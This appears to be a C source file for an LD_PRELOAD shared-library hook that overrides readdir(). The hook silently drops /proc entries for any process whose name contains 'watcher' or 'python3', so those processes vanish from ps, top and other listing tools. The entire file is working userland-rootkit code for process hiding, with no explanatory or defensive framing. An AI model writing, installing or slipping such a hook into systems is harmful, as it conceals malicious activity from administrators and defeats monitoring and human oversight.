#define _GNU_SOURCE
#include <stdio.h>
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/syscall.h>

typedef struct dirent* (*orig_readdir_t)(DIR*);

struct dirent* readdir(DIR* dirp) {
    orig_readdir_t orig_readdir = (orig_readdir_t)dlsym(RTLD_NEXT, "readdir");
    struct dirent* entry;

    while ((entry = orig_readdir(dirp)) != NULL) {
        if (entry->d_type == DT_DIR) {
            char path[256], comm[256];
            snprintf(path, sizeof(path), "/proc/%s/comm", entry->d_name);
            FILE* f = fopen(path, "r");
            if (f) {
                if (fgets(comm, sizeof(comm), f)) {
                    if (strstr(comm, "watcher") || strstr(comm, "python3")) {
                        fclose(f);
                        continue; 
                    }
                }
                fclose(f);
            }
        }
        return entry;
    }
    return NULL;
}
